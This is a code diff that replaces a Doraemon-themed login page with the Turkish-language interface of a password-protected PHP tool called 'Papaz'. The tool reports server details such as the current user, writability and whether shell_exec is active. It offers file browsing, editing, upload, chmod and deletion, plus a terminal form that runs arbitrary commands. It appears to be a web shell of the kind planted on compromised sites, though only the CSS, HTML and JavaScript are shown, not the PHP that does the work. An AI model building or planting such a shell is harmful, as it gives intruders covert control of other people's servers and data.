+        .breadcrumb a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+        
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        
+        .breadcrumb span {
+            color: var(--text-muted);
+        }
+        
+        /* File List */
+        .file-list {
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 12px;
+            border-bottom: 1px solid var(--border);
+            transition: background 0.2s;
+            cursor: pointer;
+        }
+        
+        .file-item:last-child {
+            border-bottom: none;
+        }
+        
+        .file-item:hover {
+            background: var(--bg);
+        }
+        
+        .file-icon {
+            margin-right: 10px;
+            color: var(--text-muted);
+            flex-shrink: 0;
+        }
+        
+        .file-name {
+            flex: 1;
+            font-size: 14px;
+            min-width: 0;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        
+        .file-name-link {
+            color: var(--text);
+            text-decoration: none;
+        }
+        
+        .file-name-link:hover {
+            color: var(--primary);
+        }
+        
+        .file-meta {
+            display: flex;
+            gap: 12px;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-right: 12px;
+        }
+        
+        .file-actions {
+            display: flex;
+            gap: 10px;
+            font-size: 13px;
+        }
+        
+        .action-btn {
+            padding: 6px 12px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            cursor: pointer;
+            color: var(--text-muted);
+            border-radius: 6px;
+            transition: all 0.2s;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 12px;
+            min-width: auto;
+            white-space: nowrap;
+        }
+        
+        .action-btn:hover {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+            transform: translateY(-1px);
+        }
+        
+        .action-btn.danger {
+            background: #fee2e2;
+            border-color: #fca5a5;
+            color: var(--danger);
+        }
+        
+        .action-btn.danger:hover {
+            background: var(--danger);
+            color: white;
+            border-color: var(--danger);
+        }
+        
+        /* Forms */
+        .form-group {
+            margin-bottom: 12px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        
+        .form-input, .form-textarea {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-family: inherit;
+            font-size: 14px;
+        }
+        
+        .form-input:focus, .form-textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+        
+        .form-textarea {
+            font-family: 'Courier New', monospace;
+            min-height: 500px;
+            resize: vertical;
+        }
+        
+        /* Buttons */
+        .btn {
+            padding: 8px 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #2563eb;
+        }
+        
+        .btn-success {
+            background: var(--success);
+            color: white;
+        }
+        
+        .btn-success:hover {
+            background: #059669;
+        }
+        
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #dc2626;
+        }
+        
+        .btn-outline {
+            background: white;
+            border: 1px solid var(--border);
+            color: var(--text);
+        }
+        
+        .btn-outline:hover {
+            background: var(--bg);
+        }
+        
+        .btn-block {
+            width: 100%;
+            justify-content: center;
+        }
+        
+        /* Terminal */
+        .terminal {
+            background: #1e1e1e;
+            color: #0f0;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 200px;
+            overflow-y: auto;
+            margin-top: 12px;
+        }
+        
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .modal.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 8px;
+            padding: 24px;
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .modal-title {
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--text-muted);
+            padding: 0;
+            line-height: 1;
+        }
+        
+        /* Login */
+        .login-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .login-box {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            padding: 32px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .login-box h1 {
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 20px;
+        }
+        
+        /* Sidebar Section */
+        .sidebar-section {
+            margin-bottom: 20px;
+        }
+        
+        .sidebar-section:last-child {
+            margin-bottom: 0;
+        }
+        
+        /* Info List */
+        .info-list {
+            font-size: 12px;
+        }
+        
+        .info-list-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .info-list-item:last-child {
+            border-bottom: none;
+        }
+        
+        .info-list-label {
+            color: var(--text-muted);
+        }
+        
+        .info-list-value {
+            color: var(--text);
+            font-weight: 500;
+            text-align: right;
+        }
+        
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--text-muted);
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .layout {
+                grid-template-columns: 1fr;
+            }
+            
+            .file-meta {
+                display: none;
+            }
+            
+            .file-actions {
+                flex-wrap: wrap;
                 gap: 6px;
             }
-
-            .status-dot {
-                width: 8px;
-                height: 8px;
-                background: #4caf50;
-                border-radius: 50%;
-                animation: pulse 2s infinite;
-                box-shadow: 0 0 10px #4caf50;
+            
+            .action-btn {
+                font-size: 11px;
+                padding: 5px 10px;
             }
-
-            .status-dot.yellow {
-                background: gold;
-                box-shadow: 0 0 10px gold;
+            
+            .status-bar {
+                font-size: 12px;
+                gap: 16px;
             }
-
-            @keyframes pulse {
-                0%, 100% { opacity: 1; }
-                50% { opacity: 0.3; }
-            }
-
-            /* Responsive */
-            @media (max-width: 600px) {
-                .login-card {
-                    padding: 30px 20px;
-                }
-                
-                .main-title {
-                    font-size: 32px;
-                }
-                
-                .character {
-                    width: 50px;
-                    height: 50px;
-                }
-                
-                .character:nth-child(2) {
-                    width: 70px;
-                    height: 70px;
-                }
-                
-                .floating-item {
-                    font-size: 30px;
-                }
-                
-                .door, .helicopter {
-                    display: none;
-                }
-            }
-
-            /* Mouse Trail Effect */
-            .mouse-trail {
-                position: fixed;
-                width: 10px;
-                height: 10px;
-                background: gold;
-                border-radius: 50%;
-                pointer-events: none;
-                z-index: 9999;
-                opacity: 0.6;
-                transition: all 0.1s ease;
-                box-shadow: 0 0 20px gold;
-            }
-        </style>
-    </head>
-    <body>
-        <!-- Floating Clouds -->
-        <div class="cloud cloud-1"></div>
-        <div class="cloud cloud-2"></div>
-        <div class="cloud cloud-3"></div>
+        }
         
-        <!-- Doraemon Gadgets Animation -->
-        <div class="helicopter">
-            <img src="https://res.cloudinary.com/dil0dlflt/image/upload/v1771312485/magic-doraemon-doraemon_fjxysz.gif" alt="Bamboo Helicopter">
+        @media (max-width: 1200px) {
+            .file-item {
+                flex-wrap: wrap;
+            }
+            
+            .file-actions {
+                flex-basis: 100%;
+                margin-top: 8px;
+                padding-left: 26px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<?php if (!$isAuthenticated): ?>
+    <!-- Login -->
+    <div class="login-container">
+        <div class="login-box">
+            <h1>Papaz</h1>
+            
+            <?php if (isset($loginError)): ?>
+                <div class="notification error"><?= htmlspecialchars($loginError) ?></div>
+            <?php endif; ?>
+            
+            <form method="POST">
+                <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                <div class="form-group">
+                    <input type="password" name="password" class="form-input" placeholder="Şifre girin" required autofocus>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block">Giriş Yap</button>
+        </form>
+        </div>
+    </div>
+<?php else: ?>
+    <!-- Main App -->
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>Papaz💤 </h1>
+            <a href="?logout=1" class="btn btn-danger">Çıkış</a>
         </div>
         
-        <!-- Anywhere Door -->
-        <div class="door"></div>
-        
-        <!-- Floating Doraemon Items -->
-        <div class="floating-item item-1">🔔</div>
-        <div class="floating-item item-2">🪄</div>
-        <div class="floating-item item-3">🎋</div>
-        <div class="floating-item item-4">⭐</div>
-        
-        <!-- Magic Sparkles -->
-        <div class="sparkles" id="sparkles"></div>
-        
-        <!-- Main Container -->
-        <div class="container">
-            <div class="login-card">
-                <!-- Portal Effect -->
-                <div class="portal-effect"></div>
-                
-                <!-- Doraemon Bell -->
-                <div class="bell"></div>
-                
-                <!-- Character Row -->
-                <div class="character-row">
-                    <img src="https://res.cloudinary.com/diajtnvji/image/upload/v1769527160/photo_2025-08-19_08-35-15.jpg" alt="Space" class="character">
-                    <img src="https://res.cloudinary.com/dil0dlflt/image/upload/v1771312485/magic-doraemon-doraemon_fjxysz.gif" alt="Doraemon Magic" class="character">
-                    <img src="https://res.cloudinary.com/dil0dlflt/image/upload/v1771314159/cat_v8cfnn.jpg" alt="Cat" class="character">
-                </div>
-                
-                <!-- Title Area -->
-                <div class="title-area">
-                    <h1 class="main-title">DORAEMON</h1>
-                    <div class="sub-title">MAGIC PORTAL</div>
-                </div>
-                
-                <!-- Error Message -->
-                <?php if (isset($error)): ?>
-                    <div class="error-message">
-                        <span>🔒</span>
-                        <?php echo $error; ?>
-                        <span>🔒</span>
-                    </div>
-                <?php endif; ?>
-                
-                <!-- Login Form -->
-                <form method="post">
-                    <div class="input-group">
-                        <span class="input-icon">👤</span>
-                        <input type="text" class="input-field" name="username" placeholder="Enter your username" required>
-                    </div>
-                    
-                    <div class="input-group">
-                        <span class="input-icon">🔑</span>
-                        <input type="password" class="input-field" name="password" id="password" placeholder="Enter your password" required>
-                    </div>
-                    
-                    <!-- Password Strength Indicator -->
-                    <div class="strength-indicator">
-                        <div class="strength-bar" id="strength1"></div>
-                        <div class="strength-bar" id="strength2"></div>
-                        <div class="strength-bar" id="strength3"></div>
-                    </div>
-                    
-                    <!-- Secret Gadget Row -->
-                    <div class="gadget-row">
-                        <div class="gadget" title="Anywhere Door">🚪</div>
-                        <div class="gadget" title="Bamboo Helicopter">🎋</div>
-                        <div class="gadget" title="Memory Bread">🍞</div>
-                        <div class="gadget" title="Take-copter">🚁</div>
-                    </div>
-                    
-                    <button type="submit" class="login-btn">
-                        OPEN THE MAGIC DOOR
-                    </button>
-                </form>
-                
-                <!-- Status Bar -->
-                <div class="status-bar">
-                    <div class="status-item">
-                        <span class="status-dot"></span>
-                        <span>SECRET GADGETS: 4</span>
-                    </div>
-                    <div class="status-item">
-                        <span class="status-dot yellow"></span>
-                        <span>MAGIC LEVEL: 100%</span>
-                    </div>
-                    <div class="status-item">
-                        <span>✨ v4.0</span>
-                    </div>
-                </div>
+        <?php if (!isset($_GET['edit'])): ?>
+        <!-- Status Bar -->
+        <div class="status-bar">
+            <div class="status-item">
+                <i data-lucide="hard-drive" style="width: 14px; height: 14px;"></i>
+                <span><strong><?= htmlspecialchars($systemInfo['os']) ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="code" style="width: 14px; height: 14px;"></i>
+                <span>PHP <strong><?= htmlspecialchars($systemInfo['php_version']) ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="user" style="width: 14px; height: 14px;"></i>
+                <span><strong><?= htmlspecialchars($systemInfo['current_user']) ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="edit" style="width: 14px; height: 14px;"></i>
+                <span>Yazılabilir: <strong class="<?= $systemInfo['writable'] ? 'status-ok' : 'status-error' ?>"><?= $systemInfo['writable'] ? 'EVET' : 'HAYIR' ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="terminal" style="width: 14px; height: 14px;"></i>
+                <span>Komut: <strong class="<?= $systemInfo['functions']['shell_exec'] ? 'status-ok' : 'status-error' ?>"><?= $systemInfo['functions']['shell_exec'] ? 'AKTİF' : 'PASİF' ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="database" style="width: 14px; height: 14px;"></i>
+                <span><strong><?= formatSize($systemInfo['disk_free']) ?></strong> / <?= formatSize($systemInfo['disk_total']) ?></span>
+            </div>
+            <div class="status-item" style="flex-basis: 100%; margin-top: 4px;">
+                <i data-lucide="globe" style="width: 14px; height: 14px;"></i>
+                <span>URL: <a href="<?= htmlspecialchars($currentURL) ?>" target="_blank" style="color: var(--primary); text-decoration: none;"><strong><?= htmlspecialchars($currentURL) ?></strong></a></span>
             </div>
         </div>
+        <?php endif; ?>
+        
+        <!-- Notifications -->
+        <?php if (isset($success)): ?>
+            <div class="notification success"><?= htmlspecialchars($success) ?></div>
+        <?php endif; ?>
+        
+        <?php if (isset($error)): ?>
+            <div class="notification error"><?= htmlspecialchars($error) ?></div>
+        <?php endif; ?>
+        
+            <?php if (isset($_GET['edit'])): ?>
+            <!-- Edit Mode -->
+                <?php
+            $editPath = securePath($_GET['edit'], $baseDir);
+            if ($editPath !== false && is_file($editPath)):
+                $currentURL = getCurrentURL($editPath, true);
+                ?>
+                <!-- File URL Info -->
+            <div class="status-bar" style="margin-bottom: 20px;">
+                <div class="status-item" style="flex-basis: 100%;">
+                    <i data-lucide="globe" style="width: 14px; height: 14px;"></i>
+                    <span>Dosya URL: <a href="<?= htmlspecialchars($currentURL) ?>" target="_blank" style="color: var(--primary); text-decoration: none;"><strong><?= htmlspecialchars($currentURL) ?></strong></a></span>
+                </div>
+            </div>
+            
+                <div class="panel">
+                <div class="panel-title">Dosya Düzenle: <?= htmlspecialchars(basename($editPath)) ?></div>
+                
+                <a href="?path=<?= urlencode(dirname($editPath)) ?>" class="btn btn-outline" style="margin-bottom: 16px;">
+                    ← Geri
+                </a>
+                
+                <form method="POST">
+                    <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                    <input type="hidden" name="file_path" value="<?= htmlspecialchars($editPath) ?>">
+                    <input type="hidden" name="edit_file" value="1">
+                    
+                    <div class="form-group">
+                        <textarea name="file_content" class="form-textarea"><?= htmlspecialchars(file_get_contents($editPath)) ?></textarea>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-success">Kaydet</button>
+                    </form>
+                </div>
+                <?php endif; ?>
+            <?php else: ?>
+            <!-- Browse Mode -->
+            <div class="layout">
+                <!-- Main Panel -->
+                <div class="panel">
+                    <div class="panel-title">Dosyalar</div>
+                    
+                    <!-- Breadcrumb -->
+                    <div class="breadcrumb">
+                        <?php foreach ($breadcrumbs as $index => $crumb): ?>
+                            <?php if ($index > 0): ?>
+                                <span>/</span>
+                        <?php endif; ?>
+                            
+                                <?php if ($index < count($breadcrumbs) - 1): ?>
+                                    <a href="?path=<?= urlencode($crumb['path']) ?>"><?= htmlspecialchars($crumb['name']) ?></a>
+                                <?php else: ?>
+                                    <span><?= htmlspecialchars($crumb['name']) ?></span>
+                                <?php endif; ?>
+                            <?php endforeach; ?>
+                        </div>
+                    
+                    <!-- File List -->
+                    <?php if (empty($items)): ?>
+                        <div class="empty-state">Bu klasör boş</div>
+                    <?php else: ?>
+                        <div class="file-list">
+                            <?php if ($currentPath !== $baseDir): ?>
+                                <a href="?path=<?= urlencode(dirname($currentPath)) ?>" style="text-decoration: none;">
+                                    <div class="file-item">
+                                        <i data-lucide="corner-up-left" class="file-icon" style="width: 16px; height: 16px;"></i>
+                                        <div class="file-name">..</div>
+                    </div>
+                                </a>
+                            <?php endif; ?>
+                            
+                            <?php foreach ($items as $item): ?>
+                                <div class="file-item">
+                                    <i data-lucide="<?= $item['icon'] ?>" class="file-icon" style="width: 16px; height: 16px;"></i>
+                                    
+                                    <?php if ($item['type'] === 'folder'): ?>
+                                        <a href="?path=<?= urlencode($item['path']) ?>" class="file-name file-name-link">
+                                            <?= htmlspecialchars($item['name']) ?>
+                                        </a>
+                                    <?php else: ?>
+                                        <a href="?edit=<?= urlencode($item['path']) ?>" class="file-name file-name-link">
+                                            <?= htmlspecialchars($item['name']) ?>
+                                        </a>
+                                    <?php endif; ?>
+                                    
+                                    <div class="file-meta">
+                                        <?php if ($item['type'] === 'file'): ?>
+                                            <span><?= formatSize($item['size']) ?></span>
+                                        <?php endif; ?>
+                                        <span><?= date('d.m.Y H:i', $item['modified']) ?></span>
+                                    </div>
+                                    
+                                    <div class="file-actions">
+                                        <?php if ($item['type'] === 'file'): ?>
+                                            <a href="?edit=<?= urlencode($item['path']) ?>" class="action-btn">Düzenle</a>
+                                            <a href="?download=<?= urlencode($item['path']) ?>" class="action-btn">İndir</a>
+                                        <?php endif; ?>
+                                        <button class="action-btn" onclick="openRenameModal('<?= htmlspecialchars($item['path']) ?>', '<?= htmlspecialchars($item['name']) ?>')">Yeniden Adlandır</button>
+                                        <button class="action-btn" onclick="openChmodModal('<?= htmlspecialchars($item['path']) ?>', '<?= $item['permissions'] ?>')">İzinler</button>
+                                        <button class="action-btn danger" onclick="deleteItem('<?= htmlspecialchars($item['path']) ?>', '<?= htmlspecialchars($item['name']) ?>')">Sil</button>
+                                    </div>
+                                </div>
+                            <?php endforeach; ?>
+                        </div>
+                    <?php endif; ?>
+                </div>
+                
+                <!-- Sidebar -->
+                <div>
+                    <!-- Upload -->
+                    <div class="panel sidebar-section">
+                        <div class="panel-title">Yükle</div>
+                        <form method="POST" enctype="multipart/form-data">
+                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                            <div class="form-group">
+                                <input type="file" name="upload_file" class="form-input" required>
+                            </div>
+                            <button type="submit" class="btn btn-primary btn-block">Yükle</button>
+                        </form>
+                    </div>
+                    
+                    <!-- Create -->
+                    <div class="panel sidebar-section">
+                        <div class="panel-title">Yeni Oluştur</div>
+                        <form method="POST">
+                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                            <div class="form-group">
+                                <input type="text" name="file_name" class="form-input" placeholder="Dosya adı" required>
+                            </div>
+                            <button type="submit" name="create_file" class="btn btn-success btn-block">Dosya</button>
+                                    </form>
+                        
+                        <form method="POST" style="margin-top: 8px;">
+                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                            <div class="form-group">
+                                <input type="text" name="folder_name" class="form-input" placeholder="Klasör adı" required>
+                            </div>
+                            <button type="submit" name="create_folder" class="btn btn-primary btn-block">Klasör</button>
+                                    </form>
+                    </div>
+                    
+                    <!-- Terminal -->
+                    <div class="panel sidebar-section">
+                        <div class="panel-title">Terminal</div>
+                        <form method="POST">
+                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                            <div class="form-group">
+                                <input type="text" name="command" class="form-input" placeholder="Komut" required>
+                            </div>
+                            <button type="submit" name="run_command" class="btn btn-primary btn-block">Çalıştır</button>
+                        </form>
+                        
+                        <?php if (isset($commandOutput)): ?>
+                            <div class="terminal"><?= htmlspecialchars($commandOutput) ?></div>
+                        <?php endif; ?>
+                    </div>
+                    </div>
+                </div>
+            <?php endif; ?>
+        </div>
 
-        <script>
-            // Generate sparkles
-            function createSparkles() {
-                const sparklesContainer = document.getElementById('sparkles');
-                for (let i = 0; i < 30; i++) {
-                    const sparkle = document.createElement('div');
-                    sparkle.className = 'sparkle';
-                    sparkle.style.left = Math.random() * 100 + '%';
-                    sparkle.style.top = Math.random() * 100 + '%';
-                    sparkle.style.animationDelay = Math.random() * 3 + 's';
-                    sparkle.style.animationDuration = (Math.random() * 2 + 2) + 's';
-                    sparklesContainer.appendChild(sparkle);
-                }
+    <!-- Modals -->
+    <div id="renameModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">Yeniden Adlandır</h3>
+                <button class="modal-close" onclick="closeModal('renameModal')">&times;</button>
+            </div>
+            <form method="POST">
+                <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                <input type="hidden" name="old_path" id="rename_old_path">
+                <input type="hidden" name="rename" value="1">
+                <div class="form-group">
+                    <input type="text" name="new_name" id="rename_new_name" class="form-input" required>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block">Kaydet</button>
+                </form>
+        </div>
+    </div>
+    
+    <div id="chmodModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">İzinleri Değiştir</h3>
+                <button class="modal-close" onclick="closeModal('chmodModal')">&times;</button>
+            </div>
+            <form method="POST">
+                <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                <input type="hidden" name="chmod_path" id="chmod_path">
+                <input type="hidden" name="chmod" value="1">
+                <div class="form-group">
+                    <input type="text" name="permissions" id="chmod_permissions" class="form-input" pattern="[0-7]{4}" required>
+            </div>
+                <button type="submit" class="btn btn-primary btn-block">Kaydet</button>
+            </form>
+        </div>
+    </div>
+    
+    <form id="deleteForm" method="POST" style="display: none;">
+        <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+        <input type="hidden" name="delete_path" id="delete_path">
+        <input type="hidden" name="delete" value="1">
+    </form>
+
+<script>
+    lucide.createIcons();
+        
+        function openRenameModal(path, name) {
+            document.getElementById('rename_old_path').value = path;
+            document.getElementById('rename_new_name').value = name;
+            document.getElementById('renameModal').classList.add('active');
+        }
+        
+        function openChmodModal(path, permissions) {
+            document.getElementById('chmod_path').value = path;
+            document.getElementById('chmod_permissions').value = permissions;
+            document.getElementById('chmodModal').classList.add('active');
+        }
+        
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+        }
+        
+        function deleteItem(path, name) {
+            if (confirm('Silmek istediğinizden emin misiniz?\n\n' + name)) {
+                document.getElementById('delete_path').value = path;
+                document.getElementById('deleteForm').submit();
             }
-            createSparkles();
-
-            // Password strength indicator
-            document.getElementById('password')?.addEventListener('input', function(e) {
-                const password = e.target.value;
-                const strength1 = document.getElementById('strength1');
-                const strength2 = document.getElementById('strength2');
-                const strength3 = document.getElementById('strength3');
-                
-                if (password.length === 0) {
-                    strength1.classList.remove('active');
-                    strength2.classList.remove('active');
-                    strength3.classList.remove('active');
-                } else if (password.length < 4) {
-                    strength1.classList.add('active');
-                    strength2.classList.remove('active');
-                    strength3.classList.remove('active');
-                } else if (password.length < 8) {
-                    strength1.classList.add('active');
-                    strength2.classList.add('active');
-                    strength3.classList.remove('active');
-                } else {
-                    strength1.classList.add('active');
-                    strength2.classList.add('active');
-                    strength3.classList.add('active');
-                }
-            });
-
-            // Mouse trail effect
-            document.addEventListener('mousemove', function(e) {
-                const trail = document.createElement('div');
-                trail.className = 'mouse-trail';
-                trail.style.left = e.pageX - 5 + 'px';
-                trail.style.top = e.pageY - 5 + 'px';
-                document.body.appendChild(trail);
-                
-                setTimeout(() => {
-                    trail.remove();
+        }
+        
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.classList.remove('active');
+            }
+        }
+        
+        setTimeout(function() {
+            const notifications = document.querySelectorAll('.notification');
+            notifications.forEach(function(notification) {
+                notification.style.opacity = '0';
+                notification.style.transition = 'opacity 0.5s';
+                setTimeout(function() {
+                    notification.remove();
                 }, 500);
             });
+        }, 5000);
+</script>
+<?php endif; ?>
 
-            // Floating items animation
-            const items = document.querySelectorAll('.floating-item');
-            items.forEach((item, index) => {
-                item.style.animation = `float ${6 + index}s infinite ease-in-out`;
-            });
-        </script>
-    </body>
-    </html>
-    <?php
-    exit();
-}
-?>
+</body>
+</html>
